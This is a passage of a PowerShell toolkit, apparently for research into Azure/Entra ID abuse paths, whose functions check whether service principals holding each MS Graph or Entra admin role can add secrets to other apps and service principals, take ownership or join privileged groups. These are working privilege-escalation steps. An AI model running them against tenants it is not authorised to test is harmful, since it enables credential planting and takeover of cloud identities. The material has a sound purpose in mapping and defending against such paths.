            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetSPId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add a new secret to a service principal
    $body = @{
        passwordCredential = @{
            displayName = $TestPrincipalID
        }
    }
    $Success = $False
    Try {
        $AddSPKeyCred = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)" } `
            -URI            "https://graph.microsoft.com/v1.0/servicePrincipals/$($TargetSPId)/addPassword" `
            -Method         POST `
            -Body           $($body | ConvertTo-Json) `
            -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add secret to SP"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSecretToSPDefinition' -Value (Get-Command -Name "Test-MGAddSecretToSP") -Force
New-Variable -Name 'Test-MGAddSecretToSPAst' -Value (${Test-MGAddSecretToSPDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSecretToApp {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add a new secret to an app 

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to add a new secret to an app

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER TargetAppId
        The globally unique ID of the target service principal

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddSecretToSP `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetAppId "b2bf32b5-4f9d-4df2-a7d9-136d58d25482" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can add a new secret to an app registration with object ID of "b2bf32b5-4f9d-4df2-a7d9-136d58d25482"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetAppId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add a new secret to an app
    $body = @{
        passwordCredential = @{
            displayName = $TestPrincipalID
        }
    }
    $Success = $False
    Try {
        $AddAppKeyCred = Invoke-RestMethod `
            -Headers        @{Authorization = "Bearer $($TestToken)" } `
            -URI            "https://graph.microsoft.com/v1.0/applications/$($TargetAppId)/addPassword" `
            -Method         POST `
            -Body           $($body | ConvertTo-Json) `
            -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add secret to App"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSecretToAppDefinition' -Value (Get-Command -Name "Test-MGAddSecretToApp") -Force
New-Variable -Name 'Test-MGAddSecretToAppAst' -Value (${Test-MGAddSecretToAppDefinition}.ScriptBlock.Ast.Body) -Force

Function Invoke-AllAzureMGAbuseTests {
    <#
    .SYNOPSIS
        ...

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        ...

    .PARAMETER GlobalAdminClientID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER GlobalAdminSecret
        The globally unique ID of the target role eligible security group

    .PARAMETER TenantName
        The MS Graph-scoped JWT for the test service principal

    .EXAMPLE
        C:\PS> Invoke-AllAzureMGAbuseTests `
            -GlobalAdminClientID "8e955e6f-a8dd-4195-ba65-2bfcc30e253a" `
            -GlobalAdminSecret "<secret>" `
            -TenantName "specterdev.onmicrosoft.com"

        Description
        -----------
        ...

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName
        
    )

    $GlobalAdminToken = Get-MSGraphTokenWithClientCredentials `
        -ClientID       $GlobalAdminClientID `
        -ClientSecret   $GlobalAdminSecret `
        -TenantName     $TenantName

    # Create a unique identifier for this test. Abuse test Service Principal display names will start with this string.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $MGTestResults = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()

    # Get all current app roles that can be scoped against MS Graph:
    $MGRoles = Get-MGAppRoles -Token $GlobalAdminToken.access_token

    # Perform all abuse tests, creating a unique Service Principal per MS Graph app role:
    $MGRoles | ForEach-Object -ThrottleLimit 50 -Parallel {
        $HeldPrivilege = $_.value
        $AppRoleID = $_.id

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:New-TestAppReg})                          { $ast = ${using:New-TestAppRegAst};                        ${global:New-TestAppReg} = $ast.GetScriptBlock() }
        If (-Not ${global:New-TestSP})                              { $ast = ${using:New-TestSPAst};                            ${global:New-TestSP} = $ast.GetScriptBlock() }
        If (-Not ${global:New-EntraAppSecret})                      { $ast = ${using:New-EntraAppSecretAst};                    ${global:New-EntraAppSecret} = $ast.GetScriptBlock() }
        If (-Not ${global:New-EntraAppRoleAssignment})              { $ast = ${using:New-EntraAppRoleAssignmentAst};            ${global:New-EntraAppRoleAssignment} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfToEntraRole})               { $ast = ${using:Test-MGAddSelfToEntraRoleAst};             ${global:Test-MGAddSelfToEntraRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfToMGAppRole})               { $ast = ${using:Test-MGAddSelfToMGAppRoleAst};             ${global:Test-MGAddSelfToMGAppRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfAsOwnerOfSP})               { $ast = ${using:Test-MGAddSelfAsOwnerOfSPAst};             ${global:Test-MGAddSelfAsOwnerOfSP} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfAsOwnerOfApp})              { $ast = ${using:Test-MGAddSelfAsOwnerOfAppAst};            ${global:Test-MGAddSelfAsOwnerOfApp} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddOwnerToRoleEligibleGroup})      { $ast = ${using:Test-MGAddOwnerToRoleEligibleGroupAst};    ${global:Test-MGAddOwnerToRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddMemberToRoleEligibleGroup})     { $ast = ${using:Test-MGAddMemberToRoleEligibleGroupAst};   ${global:Test-MGAddMemberToRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddOwnerToNonRoleEligibleGroup})   { $ast = ${using:Test-MGAddOwnerToNonRoleEligibleGroupAst}; ${global:Test-MGAddOwnerToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddMemberToNonRoleEligibleGroup})  { $ast = ${using:Test-MGAddMemberToNonRoleEligibleGroupAst};${global:Test-MGAddMemberToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSecretToSP})                    { $ast = ${using:Test-MGAddSecretToSPAst};                  ${global:Test-MGAddSecretToSP} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSecretToApp})                   { $ast = ${using:Test-MGAddSecretToAppAst};                 ${global:Test-MGAddSecretToApp} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddRootCACert})                    { $ast = ${using:Test-MGAddRootCACertAst};                  ${global:Test-MGAddRootCACert} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadAppRegDisplayName = $(${using:TestGUID} + "-" + $_.AppRoleValue)

        # Create the test app reg:
        $ThreadSafeAppReg = (& ${global:New-TestAppReg} `
            -DisplayName $ThreadAppRegDisplayName `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the app reg to propagate before creating the SP for the app reg
        Start-Sleep 60s

        # Create the test SP:
        $ThreadSafeSP = (& ${global:New-TestSP} `
            -AppId $ThreadSafeAppReg.AppRegAppId `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the SP to propagate before creating a secret for the app reg.
        Start-Sleep 60s

        # Create a secret for the test app reg:
        $ThreadSafeSecret = (& ${global:New-EntraAppSecret} `
            -AppRegObjectID $ThreadSafeAppReg.AppRegObjectID `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the secret to propagate before granting the MS Graph app role to the test app:
        Start-Sleep 60s

        # Grant the MS Graph App Role to the SP
        $MSGraphAppRoleActivation = (& ${global:New-EntraAppRoleAssignment} `
            -SPObjectID $ThreadSafeSP.SPObjectId `
            -AppRoleID $AppRoleID `
            -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )

        #Wait 5 minutes for the role activation to take effect
        Start-Sleep 300s

        # Get test token
        $ThreadSafeTestToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID       $ThreadSafeSecret.AppRegAppId `
            -ClientSecret   $ThreadSafeSecret.AppRegSecretValue `
            -TenantName     ${using:TenantName}
        )

        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetSPId         "0e0d0975-59cb-4065-9b11-e5c960617a46" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetAppId        "57cf2904-6741-484d-a781-2ecbb13ace62" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetAppId        "57cf2904-6741-484d-a781-2ecbb13ace62" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
            -TestPrincipalId $ThreadSafeSP.SPObjectId `
            -TargetSPId         "0e0d0975-59cb-4065-9b11-e5c960617a46" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
            -TestPrincipalId        $ThreadSafeSP.SPObjectId `
            -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
            -TestToken              $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege          $HeldPrivilege `
            -TestGUID               ${using:TestGUID} `
            -TimeOfTest             $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfToEntraRole} `
            -TestPrincipalId $ThreadSafeSP.SPObjectId `
            -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddRootCACert} `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

    }
    $MGTestResults
}

Function Invoke-AllEntraAbuseTests {
    <#
    .SYNOPSIS
        ...

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Perform all abuse tests enabled by holding a particular Azure AD Admin role

    .PARAMETER GlobalAdminClientID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER GlobalAdminSecret
        The globally unique ID of the target role eligible security group

    .PARAMETER TenantName
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER AbuseTestType
        The type of abuse test you want to run. Default behavior: run all tests

    .EXAMPLE
        C:\PS> $Tests = Invoke-AllEntraAbuseTests `
            -GlobalAdminClientID "aab7d158-7037-45f1-9ed1-e9ec0222d927" `
            -GlobalAdminSecret "<secret>" `
            -TenantName "specterdev.onmicrosoft.com"

        Description
        -----------
        ...

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName,

        [Parameter(
            Mandatory = $False,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AbuseTestType
        
    )

    $GlobalAdminToken = Get-MSGraphTokenWithClientCredentials `
        -ClientID       $GlobalAdminClientID `
        -ClientSecret   $GlobalAdminSecret `
        -TenantName     $TenantName

    # Create a unique identifier for this test. Abuse test Service Principal display names will start with this string.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $MGTestResults = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()

    # Using the Global Admin token, get the current list of available Entra admin role templates:
    $URI        =   'https://graph.microsoft.com/v1.0/directoryRoleTemplates'
    $Request    =   $null
    $Request    =   Invoke-RestMethod `
                        -Headers @{Authorization = "Bearer $($GlobalAdminToken.access_token)"} `
                        -URI $URI `
                        -Method GET
    $EntraRoleTemplates = $Request.value
    
    # Using the Global Admin token, activate all the admin roles
    $EntraRoleTemplates | ForEach-Object {
        $Role = $_
   
        $body = @{
            roleTemplateId = $Role.id
        }
        try {
            $ActivateRole = Invoke-RestMethod `
                -Uri "https://graph.microsoft.com/v1.0/directoryRoles" `
                -Headers @{Authorization = "Bearer $($GlobalAdminToken.access_token)"} `
                -Method POST `
                -ContentType 'application/json' `
                -Body $($body | ConvertTo-Json)
        }
        Catch {

        }
    }
    
    # Using my Global Admin token, get the active Entra roles
    $URI        =   'https://graph.microsoft.com/v1.0/directoryRoles'
    $Request    =   $null
    $Request    =   Invoke-RestMethod `
                        -Headers @{Authorization = "Bearer $($GlobalAdminToken.access_token)"} `
                        -URI $URI `
                        -Method GET
    $EntraRoles = $Request.value

    # Perform all abuse tests, creating a unique Service Principal per Azure AD admin role:
    #$MGRoles | ?{$_.AppRoleValue -Match "RoleManagement"} | ForEach-Object -ThrottleLimit 50 -Parallel {
    $EntraRoles | ForEach-Object -ThrottleLimit 50 -Parallel {
        $HeldPrivilege = $_.displayName

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:New-TestAppReg})                          { $ast = ${using:New-TestAppRegAst};                        ${global:New-TestAppReg} = $ast.GetScriptBlock() }
        If (-Not ${global:New-TestSP})                              { $ast = ${using:New-TestSPAst};                            ${global:New-TestSP} = $ast.GetScriptBlock() }
        If (-Not ${global:New-EntraAppSecret})                      { $ast = ${using:New-EntraAppSecretAst};                    ${global:New-EntraAppSecret} = $ast.GetScriptBlock() }
        If (-Not ${global:New-EntraAppRoleAssignment})              { $ast = ${using:New-EntraAppRoleAssignmentAst};            ${global:New-EntraAppRoleAssignment} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfToEntraRole})               { $ast = ${using:Test-MGAddSelfToEntraRoleAst};             ${global:Test-MGAddSelfToEntraRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfToMGAppRole})               { $ast = ${using:Test-MGAddSelfToMGAppRoleAst};             ${global:Test-MGAddSelfToMGAppRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfAsOwnerOfSP})               { $ast = ${using:Test-MGAddSelfAsOwnerOfSPAst};             ${global:Test-MGAddSelfAsOwnerOfSP} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfAsOwnerOfApp})              { $ast = ${using:Test-MGAddSelfAsOwnerOfAppAst};            ${global:Test-MGAddSelfAsOwnerOfApp} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddOwnerToRoleEligibleGroup})      { $ast = ${using:Test-MGAddOwnerToRoleEligibleGroupAst};    ${global:Test-MGAddOwnerToRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddMemberToRoleEligibleGroup})     { $ast = ${using:Test-MGAddMemberToRoleEligibleGroupAst};   ${global:Test-MGAddMemberToRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddOwnerToNonRoleEligibleGroup})   { $ast = ${using:Test-MGAddOwnerToNonRoleEligibleGroupAst}; ${global:Test-MGAddOwnerToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddMemberToNonRoleEligibleGroup})  { $ast = ${using:Test-MGAddMemberToNonRoleEligibleGroupAst};${global:Test-MGAddMemberToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSecretToSP})                    { $ast = ${using:Test-MGAddSecretToSPAst};                  ${global:Test-MGAddSecretToSP} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSecretToApp})                   { $ast = ${using:Test-MGAddSecretToAppAst};                 ${global:Test-MGAddSecretToApp} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadAppRegDisplayName = $(${using:TestGUID} + "-" + $_.displayName)

        # Create the test app reg:
        $ThreadSafeAppReg = (& ${global:New-TestAppReg} `
            -DisplayName $ThreadAppRegDisplayName `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the app reg to propagate before creating the SP for the app reg
        Start-Sleep 60s

        # Create the test SP:
        $ThreadSafeSP = (& ${global:New-TestSP} `
            -AppId $ThreadSafeAppReg.AppRegAppId `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the SP to propagate before creating a secret for the app reg.
        Start-Sleep 60s

        # Create a secret for the test app reg:
        $ThreadSafeSecret = (& ${global:New-EntraAppSecret} `
            -AppRegObjectID $ThreadSafeAppReg.AppRegObjectID `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the secret to propagate before granting the MS Graph app role to the test app:
        Start-Sleep 60s

        # Grant the Entra admin role to the test service principal
        $body = @{
            "@odata.id" =  "https://graph.microsoft.com/v1.0/directoryObjects/$($ThreadSafeSP.SPObjectId)"
        }
        $GrantRole = Invoke-RestMethod -Headers @{Authorization = "Bearer $($ThreadSafeGlobalAdminToken.access_token)" } `
            -Uri "https://graph.microsoft.com/v1.0/directoryRoles/$($_.id)/members/`$ref" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'

        #Wait 5 minutes for the role activation to take effect
        Start-Sleep 300s

        # Get test token
        $ThreadSafeTestToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID       $ThreadSafeSecret.AppRegAppId `
            -ClientSecret   $ThreadSafeSecret.AppRegSecretValue `
            -TenantName     ${using:TenantName}
        )

        Switch (${using:AbuseTestType}) {

            MGAddOwnerToRoleEligibleGroup {
                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSecretToSP {
                $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetSPId         $ThreadSafeSP.SPObjectId `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSecretToApp {
                $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddMemberToRoleEligibleGroup {
                $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSelfAsOwnerOfApp {
                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddOwnerToNonRoleEligibleGroup {
                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
